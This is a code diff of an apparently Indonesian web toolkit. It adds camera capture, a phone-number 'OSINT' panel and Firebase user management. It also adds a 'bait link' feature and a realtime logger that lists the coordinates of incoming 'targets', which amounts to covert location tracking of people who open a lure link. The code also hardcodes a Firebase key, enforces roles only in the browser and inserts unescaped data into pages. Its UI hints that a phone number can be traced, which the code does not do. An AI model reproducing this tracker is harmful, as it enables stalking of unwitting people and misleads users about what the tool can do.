+  if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
+  let rec;
+  try { rec = new MediaRecorder(camStream, { mimeType: mime }); }
+  catch(e) { rec = new MediaRecorder(camStream); }
+  rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+  rec.onstop = async () => {
+    const blob = new Blob(chunks, { type: 'video/webm' });
+    const url = URL.createObjectURL(blob);
+    visualFlash();
+    const photo = await captureFrame();
+    camResultItems.unshift({ type: 'live', url, photo });
+    renderCamResult();
+    document.getElementById('camStatus').textContent = 'Live Photo tersimpan.';
+  };
+  rec.start();
+  setTimeout(() => rec.stop(), 3000);
+}
+
+function renderCamResult() {
+  const box = document.getElementById('camResult');
+  box.innerHTML = '';
+  camResultItems.forEach((item, i) => {
+    const div = document.createElement('div');
+    div.className = 'shot';
+    if (item.type === 'image') {
+      div.innerHTML = `<img src="${item.url}"><button class="dl" onclick="downloadCamItem(${i})">↓</button>`;
+    } else if (item.type === 'video') {
+      div.innerHTML = `<video src="${item.url}" controls></video><button class="dl" onclick="downloadCamItem(${i})">↓</button>`;
+    } else if (item.type === 'live') {
+      div.innerHTML = `<img src="${item.photo}"><span class="live-tag">LIVE</span><button class="dl" onclick="downloadCamItem(${i})">↓</button><button class="dl" style="left:4px; right:auto; background:#7cc6fe;" onclick="downloadCamLiveVideo(${i})">▶</button>`;
+    }
+    box.appendChild(div);
+  });
+}
+
+window.downloadCamItem = function(i) {
+  const item = camResultItems[i];
+  const a = document.createElement('a');
+  if (item.type === 'image') { a.href = item.url; a.download = 'ex-tools-photo-' + Date.now() + '.jpg'; }
+  else if (item.type === 'video') { a.href = item.url; a.download = 'ex-tools-video-' + Date.now() + '.webm'; }
+  else if (item.type === 'live') { a.href = item.photo; a.download = 'ex-tools-live-' + Date.now() + '.jpg'; }
+  a.click();
+};
+window.downloadCamLiveVideo = function(i) {
+  const item = camResultItems[i];
+  if (!item || item.type !== 'live') return;
+  const a = document.createElement('a');
+  a.href = item.url; a.download = 'ex-tools-live-' + Date.now() + '.webm'; a.click();
+};
+
+// ============================================================
+// OSINT NOMOR WA
+// ============================================================
+const OPERATOR_PREFIX = [
+  { prefix: ['0811','0812','0813','0821','0822','0823','0851','0852','0853'], name: 'Telkomsel', color: '#ff4d4d' },
+  { prefix: ['0814','0815','0816','0855','0856','0857','0858'], name: 'Indosat Ooredoo', color: '#ffd43b' },
+  { prefix: ['0817','0818','0819','0859','0877','0878'], name: 'XL Axiata', color: '#7cc6fe' },
+  { prefix: ['0831','0832','0833','0838'], name: 'Axis', color: '#c9a6ff' },
+  { prefix: ['0895','0896','0897','0898','0899'], name: 'Tri (3)', color: '#ff8fab' },
+  { prefix: ['0881','0882','0883','0884','0885','0886','0887','0888','0889'], name: 'Smartfren', color: '#7bf1a8' }
+];
+
+function detectOperator(num) {
+  const n = num.replace(/[^0-9]/g, '');
+  let local = n;
+  if (local.startsWith('62')) local = '0' + local.slice(2);
+  for (const op of OPERATOR_PREFIX) {
+    for (const p of op.prefix) {
+      if (local.startsWith(p)) return op;
+    }
+  }
+  return { name: 'Tidak diketahui', color: '#999' };
+}
+
+window.runOSINT = async function() {
+  const raw = document.getElementById('osintNumber').value.trim();
+  const rawCoords = document.getElementById('osintCoords').value.trim();
+  const box = document.getElementById('osintResult');
+  
+  if (!raw && !rawCoords) { 
+    box.innerHTML = '<p style="color:var(--red);font-weight:bold;font-size:13px;">Masukkan Nomor WA atau Koordinat dulu!</p>'; 
+    return; 
+  }
+
+  box.innerHTML = `<div class="osint-card"><p style="font-size:12px;color:var(--muted);margin:0;">Melacak data...</p></div>`;
+
+  let lat = null, lon = null, address = '';
+  let waData = null;
+
+  // 1. Jika input nomor WA, deteksi operator
+  if (raw) {
+    const clean = raw.replace(/[^0-9]/g, '');
+    if (clean.length >= 9 && clean.length <= 15) {
+      const op = detectOperator(clean);
+      let local = clean.startsWith('62') ? '0' + clean.slice(2) : clean;
+      if (!local.startsWith('0')) local = '0' + local;
+      const intl = '62' + local.slice(1);
+      waData = { local, intl, op };
+    }
+  }
+
+  // 2. Jika input koordinat manual, ambil lat/lon
+  if (rawCoords) {
+    const parts = rawCoords.replace(/[()]/g, '').split(',');
+    if (parts.length === 2) {
+      lat = parseFloat(parts[0].trim());
+      lon = parseFloat(parts[1].trim());
+    }
+  } 
+  // 3. Jika cuma input nomor WA, pakai GPS lu sebagai fallback koordinat
+  else if (raw) {
+    if (navigator.geolocation) {
+      try {
+        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+      } catch(e) {}
+    }
+  }
+
+  // 4. Reverse Geocoding (Ubah koordinat jadi alamat lengkap)
+  if (lat && lon) {
+    try {
+      const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+      const revData = await rev.json();
+      address = revData.display_name || '';
+    } catch(e) { console.log('Gagal ambil alamat'); }
+  }
+
+  let resultHTML = '';
+
+  // Tampilkan Data Nomor WA
+  if (waData) {
+    resultHTML += `
+      <div class="osint-card">
+        <h4 style="margin-top:0; border-bottom:2px solid var(--ink); padding-bottom:5px;">Data Nomor WA</h4>
+        <div class="osint-row"><span class="k">Nomor</span><span class="v">${waData.local}</span></div>
+        <div class="osint-row"><span class="k">Format Internasional</span><span class="v">+${waData.intl}</span></div>
+        <div class="osint-row"><span class="k">Operator</span><span class="v"><span class="osint-badge" style="background:${waData.op.color};">${waData.op.name}</span></span></div>
+      </div>
+    `;
+  }
+
+  // Tampilkan Data Koordinat & Alamat
+  if (lat && lon) {
+    resultHTML += `
+      <div class="osint-card">
+        <h4 style="margin-top:0; border-bottom:2px solid var(--ink); padding-bottom:5px;">Lokasi & Alamat</h4>
+        <div class="osint-row"><span class="k">Koordinat</span><span class="v">${lat.toFixed(6)}, ${lon.toFixed(6)}</span></div>
+        ${address ? `<div class="osint-row"><span class="k">Alamat Lengkap</span><span class="v" style="font-size:12px; line-height:1.4;">${address}</span></div>` : ''}
+        <div style="margin-top:10px;">
+          <a class="osint-map-btn" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="background:var(--mint); width:100%; justify-content:center;">📍 Buka di Google Maps</a>
+        </div>
+      </div>
+    `;
+  } else if (rawCoords) {
+    resultHTML += `<p style="color:var(--red);font-weight:bold;font-size:13px;">Format koordinat salah. Gunakan koma (contoh: -6.2, 106.8).</p>`;
+  }
+
+  box.innerHTML = resultHTML + `
+    <p style="font-size:11px;color:var(--muted);margin-top:10px;">⚠️ Jika pakai Nomor WA, koordinat diambil dari GPS device kamu. Untuk melacak nomor orang lain, masukkan koordinat manual dari Google Maps.</p>
+  `;
+};
+
 // ANTI COPY
 document.addEventListener('copy', e => e.preventDefault());
 document.addEventListener('cut', e => e.preventDefault());
@@ -1393,7 +1953,7 @@ document.addEventListener('cut', e => e.preventDefault());
 <!-- ========================================== -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-  import { getDatabase, ref, push, onValue, set, remove, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+  import { getDatabase, ref, push, onValue, set, remove, update, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyCf4zROrCmIp4JZk_i08RVCcXNLZP-LpmI",
@@ -1407,6 +1967,7 @@ document.addEventListener('cut', e => e.preventDefault());
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
+  // Deklarasi variabel WAJIB di atas sebelum dipake
   let currentUser = null;
   let isMaintenanceMode = false;
 
@@ -1458,6 +2019,19 @@ document.addEventListener('cut', e => e.preventDefault());
 
   function loginSuccess(user) {
     currentUser = user;
+
+    // --- FITUR ONLINE/OFFLINE REALTIME ---
+    const connectedRef = ref(db, ".info/connected");
+    onValue(connectedRef, (snap) => {
+      if (snap.val() === true) {
+        const userStatusRef = ref(db, '/status/' + currentUser.username);
+        onDisconnect(userStatusRef).set({ state: 'offline', last_changed: Date.now() }).then(() => {
+          set(userStatusRef, { state: 'online', last_changed: Date.now() });
+        });
+      }
+    });
+    // --------------------------------------
+
     document.getElementById('splashScreen').classList.add('hide');
     document.getElementById('mainHeader').style.display = 'block';
     document.getElementById('mainFooter').style.display = 'block';
@@ -1495,11 +2069,27 @@ document.addEventListener('cut', e => e.preventDefault());
     modalRoleTag.innerText = user.role;
     modalRoleTag.className = 'role-tag role-' + user.role.toLowerCase();
 
-    if(user.role === 'Developer') {
+    // DEBUG - buka Console (F12) buat lihat role sebenarnya
+    console.log('[LOGIN] role:', user.role, '| lowercase:', (user.role||'').toLowerCase());
+
+    const roleLower = (user.role || '').toLowerCase();
+    const isDev = roleLower === 'developer';
+    const isMod = roleLower === 'moderator';
+    const isAdmin = isDev || isMod;
+
+    if(isAdmin) {
       document.getElementById('adminInputContainer').style.display = 'block';
       document.getElementById('nav-adduser').style.display = 'block';
+      document.getElementById('nav-adduser').style.color = isMod ? '#ffb86c' : 'var(--violet)';
+      const btnMaint = document.getElementById('btnMaintenance');
+      if(btnMaint) btnMaint.style.display = isDev ? 'block' : 'none';
       document.getElementById('ratingInputBox').style.display = 'none';
-      document.querySelectorAll('.btn-hapus-info').forEach(btn => btn.style.display = 'block');
+      document.querySelectorAll('.btn-hapus-info').forEach(btn => {
+        btn.style.display = isDev ? 'block' : 'none';
+      });
+      if(isMod && isMaintenanceMode) {
+        document.getElementById('maintenanceUI').style.display = 'flex';
+      }
     } else {
       document.getElementById('adminInputContainer').style.display = 'none';
       document.getElementById('nav-adduser').style.display = 'none';
@@ -1598,6 +2188,12 @@ document.addEventListener('cut', e => e.preventDefault());
   }
 
   window.doLogout = function() {
+    // Set offline pas keluar web
+    if(currentUser) {
+      const userStatusRef = ref(db, '/status/' + currentUser.username);
+      set(userStatusRef, { state: 'offline', last_changed: Date.now() });
+    }
+
     currentUser = null;
     document.getElementById('mainHeader').style.display = 'none';
     document.getElementById('mainFooter').style.display = 'none';
@@ -1647,7 +2243,7 @@ document.addEventListener('cut', e => e.preventDefault());
               <h3 class="pengumuman-title">${item.judul}</h3>
               <div class="pengumuman-body">${item.isi}</div>
             </div>
-            ${currentUser && currentUser.role === 'Developer' ? `<button onclick="promptDeleteInfo('${key}')" style="background:none; border:none; cursor:pointer; color:var(--ink); font-size:20px; padding:0; display:flex; align-items:center; justify-content:center;"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" /><line x1="10" y1="11" x2="10" y2="17" /><line x1="14" y1="11" x2="14" y2="17" /></svg></button>` : ''}
+            ${currentUser && (currentUser.role || '').toLowerCase() === 'developer' ? `<button onclick="promptDeleteInfo('${key}')" style="background:none; border:none; cursor:pointer; color:var(--ink); font-size:20px; padding:0; display:flex; align-items:center; justify-content:center;"><svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" /><line x1="10" y1="11" x2="10" y2="17" /><line x1="14" y1="11" x2="14" y2="17" /></svg></button>` : ''}
           </div>
         `;
         container.appendChild(card);
@@ -1657,10 +2253,16 @@ document.addEventListener('cut', e => e.preventDefault());
 
   document.getElementById('form-info').addEventListener('submit', (e) => {
     e.preventDefault();
+    if(!currentUser) { showGlassNotif('Harus login dulu!'); return; }
+    const roleLower = (currentUser.role || '').toLowerCase();
+    if(roleLower !== 'developer' && roleLower !== 'moderator') {
+      showGlassNotif('Hanya Developer/Moderator yang bisa kirim pengumuman!');
+      return;
+    }
     const judul = document.getElementById('input-info-title').value;
     const isi = document.getElementById('input-info-body').value;
     if (judul && isi) {
-      push(infoRef, { judul, isi, timestamp: Date.now() }).then(() => {
+      push(infoRef, { judul, isi, timestamp: Date.now(), author: currentUser.username }).then(() => {
         document.getElementById('input-info-title').value = ''; document.getElementById('input-info-body').value = '';
         showGlassNotif('Info ditambahkan!');
       });
@@ -1730,10 +2332,20 @@ document.addEventListener('cut', e => e.preventDefault());
   });
 
   window.rejectUser = function(username) {
+    if(!currentUser) { showGlassNotif('Harus login dulu!'); return; }
+    const rl = (currentUser.role || '').toLowerCase();
+    if(rl !== 'developer' && rl !== 'moderator') {
+      showGlassNotif('Hanya Developer/Moderator yang bisa reject!'); return;
+    }
     remove(ref(db, 'requests/' + username)).then(() => showGlassNotif('Request ditolak.'));
   };
 
   window.acceptUser = function(username, uname, pass) {
+    if(!currentUser) { showGlassNotif('Harus login dulu!'); return; }
+    const rl = (currentUser.role || '').toLowerCase();
+    if(rl !== 'developer' && rl !== 'moderator') {
+      showGlassNotif('Hanya Developer/Moderator yang bisa ACC!'); return;
+    }
     document.getElementById('delModalTitle').innerText = `ACC User: ${uname}`;
     document.getElementById('delModalDesc').innerHTML = `Pilih Role:
       <select id="selectRole" style="width:100%; margin-top:10px; padding:8px; border:2px solid var(--ink); border-radius:8px; background:var(--card); color:var(--ink); font-weight:bold;">
@@ -1765,30 +2377,46 @@ document.addEventListener('cut', e => e.preventDefault());
     };
   };
   
-  onValue(ref(db, 'users'), (snap) => {
+  // Data temporary buat gabungin user dan status
+  let allUsersData = {};
+  let allStatusData = {};
+
+  function renderUsersList() {
     const activeBox = document.getElementById('activeUsersBox');
     const countEl = document.getElementById('totalUsersCount');
+    if(!activeBox) return;
     activeBox.innerHTML = '';
-    const data = snap.val();
     
-    if (!data) { 
+    if (Object.keys(allUsersData).length === 0) { 
       activeBox.innerHTML = '<p style="text-align:center;font-size:12px;color:var(--muted);">Belum ada user.</p>'; 
-      countEl.innerText = '0'; 
+      if(countEl) countEl.innerText = '0'; 
       return; 
     }
     
     let count = 0;
-    Object.keys(data).forEach(key => {
+    Object.keys(allUsersData).forEach(key => {
       count++;
-      const isBanned = data[key].status === 'banned';
+      const data = allUsersData[key];
+      const isBanned = data.status === 'banned';
+      const roleKey = (data.role || 'user').toLowerCase();
+      const roleColor = roleKey === 'developer' ? 'var(--violet)' : roleKey === 'owner' ? 'var(--yellow)' : roleKey === 'moderator' ? '#ffb86c' : roleKey === 'partner' ? '#7cc6fe' : 'var(--mint)';
       
+      // Cek status online
+      const isOnline = allStatusData[data.username] && allStatusData[data.username].state === 'online';
+      
+      // 1 DOT SAJA: Hijau = Online, Merah = Offline
+      const statusDot = isOnline 
+        ? '<span class="status-dot" style="background:#00e676;" title="Online"></span>' 
+        : '<span class="status-dot" style="background:#ff4d4d;" title="Offline"></span>';
+
       activeBox.innerHTML += `
         <div class="user-row" style="${isBanned ? 'background: rgba(255, 77, 77, 0.1);' : ''}">
           <span>
-            <b>${data[key].username}</b> 
+            ${statusDot}
+            <b>${data.username}</b> 
             ${isBanned ? '<span style="color:var(--red); font-size:10px; font-weight:bold; margin-left:5px;">(BANNED)</span>' : ''}
             <br>
-            <small style="font-size:10px; color:var(--muted);">${data[key].role}</small>
+            <small style="font-size:10px; color:${roleColor}; font-weight:800; margin-left:20px;">${data.role}</small>
           </span>
           <div class="action-btns">
             <button class="act-btn act-del" onclick="deleteUser('${key}')">🗑️</button>
@@ -1797,10 +2425,17 @@ document.addEventListener('cut', e => e.preventDefault());
       `;
     });
     
-    if (count === 0) {
-       activeBox.innerHTML = '<p style="text-align:center;font-size:12px;color:var(--muted);">Belum ada user.</p>';
-    }
-    countEl.innerText = count;
+    if(countEl) countEl.innerText = count;
+  }
+
+  onValue(ref(db, 'users'), (snap) => {
+    allUsersData = snap.val() || {};
+    renderUsersList();
+  });
+
+  onValue(ref(db, 'status'), (snap) => {
+    allStatusData = snap.val() || {};
+    renderUsersList();
   });
 
   window.deleteUser = function(username) {
@@ -1961,15 +2596,15 @@ document.addEventListener('cut', e => e.preventDefault());
           </div>
           <p style="font-size:13px; margin:5px 0;">${r.text}</p>
           
-          ${r.reply ? `<div class="rating-reply"><b>Developer:</b> ${r.reply} 
-            ${currentUser && currentUser.role === 'Developer' ? `<button onclick="openGlassModal('Edit Balasan', 'editReply', '${key}', '${r.reply.replace(/'/g, "\\'")}')" style="background:none; border:none; cursor:pointer; font-size:11px; color:var(--violet); text-decoration:underline; padding:0; margin-left:5px;">Edit</button>` : ''}
+          ${r.reply ? `<div class="rating-reply"><b>Admin:</b> ${r.reply} 
+            ${currentUser && (currentUser.role === 'Developer' || currentUser.role === 'Moderator') ? `<button onclick="openGlassModal('Edit Balasan', 'editReply', '${key}', '${r.reply.replace(/'/g, "\\'")}')" style="background:none; border:none; cursor:pointer; font-size:11px; color:var(--violet); text-decoration:underline; padding:0; margin-left:5px;">Edit</button>` : ''}
           </div>` : ''}
           
           <!-- Tombol Edit Ulasan untuk User Sendiri -->
           ${isMyReview ? `<button onclick="openGlassModal('Edit Ulasan Kamu', 'editUser', '${key}', '${r.text.replace(/'/g, "\\'")}', ${r.stars}, true)" style="background:none; border:none; cursor:pointer; font-size:11px; color:var(--violet); text-decoration:underline; padding:0; margin-top:5px; display:block;">Edit Ulasan</button>` : ''}
           
           <!-- Tombol Balas untuk Developer -->
-          ${currentUser && currentUser.role === 'Developer' && !r.reply && !isMyReview ? `<button class="btn secondary" style="margin-top:8px; font-size:11px; padding:4px 10px;" onclick="openGlassModal('Balas Ulasan', 'reply', '${key}', '')">Balas</button>` : ''}
+          ${currentUser && (currentUser.role === 'Developer' || currentUser.role === 'Moderator') && !r.reply && !isMyReview ? `<button class="btn secondary" style="margin-top:8px; font-size:11px; padding:4px 10px;" onclick="openGlassModal('Balas Ulasan', 'reply', '${key}', '')">Balas</button>` : ''}
         </div>
       `;
     });
@@ -1994,6 +2629,68 @@ document.addEventListener('cut', e => e.preventDefault());
   window.setRating = setRating;
   window.submitRating = submitRating;
   // window.replyRating = replyRating;
+
+  // ============================================================
+  // FITUR COPY LINK UMPAN
+  // ============================================================
+  window.copyLinkPelacak = function() {
+    const linkInput = document.getElementById('linkPelacak');
+    if (!linkInput.value.trim()) {
+      showGlassNotif('Isi link umpan dulu!');
+      return;
+    }
+    linkInput.select();
+    linkInput.setSelectionRange(0, 99999); // Buat mobile
+    navigator.clipboard.writeText(linkInput.value);
+    showGlassNotif('Link umpan berhasil di-copy!');
+  };
+
+  // ============================================================
+  // FITUR REALTIME PELACAK (OSINT LOGGER)
+  // ============================================================
+  const lacakRef = ref(db, 'lokasi_pelacak');
+  onValue(lacakRef, (snapshot) => {
+    const container = document.getElementById('realtime-lokasi-container');
+    if(!container) return;
+    container.innerHTML = '';
+    const data = snapshot.val();
+    console.log('[OSINT] Data target masuk:', data);
+    
+    if(!data) {
+      container.innerHTML = '<p style="font-size:12px; color:var(--muted); text-align:center;">Belum ada target yang masuk.</p>';
+      return;
+    }
+
+    const keys = Object.keys(data).reverse().slice(0, 10);
+    
+    keys.forEach((key, idx) => {
+      const item = data[key];
+      const tgl = new Date(item.waktu).toLocaleString('id-ID');
+      const mapLink = `https://www.google.com/maps?q=${item.lat},${item.lon}`;
+      
+      container.innerHTML += `
+        <div class="osint-card" style="border-color:var(--red); margin-bottom:10px; position:relative;">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+            <span style="background:var(--red); color:white; font-size:10px; font-weight:bold; padding:3px 8px; border-radius:99px;">TARGET #${keys.length - idx}</span>
+            <span style="font-size:10px; color:var(--muted);">${tgl}</span>
+          </div>
+          <div class="osint-row"><span class="k">Latitude</span><span class="v">${item.lat.toFixed(6)}</span></div>
+          <div class="osint-row"><span class="k">Longitude</span><span class="v">${item.lon.toFixed(6)}</span></div>
+          <div class="osint-row"><span class="k">Sumber</span><span class="v">${item.sumber || 'Web Umpan'}</span></div>
+          <div style="margin-top:10px; display:flex; gap:5px;">
+            <a href="${mapLink}" target="_blank" class="osint-map-btn" style="flex:1; justify-content:center; background:var(--mint);">📍 Buka di Google Maps</a>
+            <button onclick="hapusLokasi('${key}')" class="osint-map-btn" style="background:var(--pink); padding:8px 12px;">🗑️</button>
+          </div>
+        </div>
+      `;
+    });
+  });
+
+  window.hapusLokasi = function(key) {
+    if(confirm('Hapus data target ini?')) {
+      remove(ref(db, 'lokasi_pelacak/' + key));
+    }
+  };
 </script>
 </body>
 </html>
